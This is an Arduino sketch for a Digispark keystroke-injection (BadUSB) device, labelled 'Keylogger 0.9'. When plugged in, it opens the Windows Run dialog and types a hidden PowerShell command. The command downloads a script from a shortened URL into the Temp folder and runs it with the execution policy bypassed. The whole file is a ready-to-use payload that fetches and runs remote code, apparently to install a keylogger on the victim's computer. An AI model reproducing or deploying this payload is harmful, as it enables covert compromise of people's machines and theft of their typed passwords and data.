#include <DigiKeyboardFi.h>

void setup() {}

void loop() {
  // Description: Keylogger 0.9
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboardFi.print("powershell -w Hidden -c \"(New-Object System.Net.WebClient).DownloadFile(\'https://tinyurl.com/588af6f2\', \\\"$env:Temp\\maltsu.ps1\\\"); powershell -ExecutionPolicy Bypass \\\"$env:Temp\\maltsu.ps1\\\"\"");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);
  exit(0);
}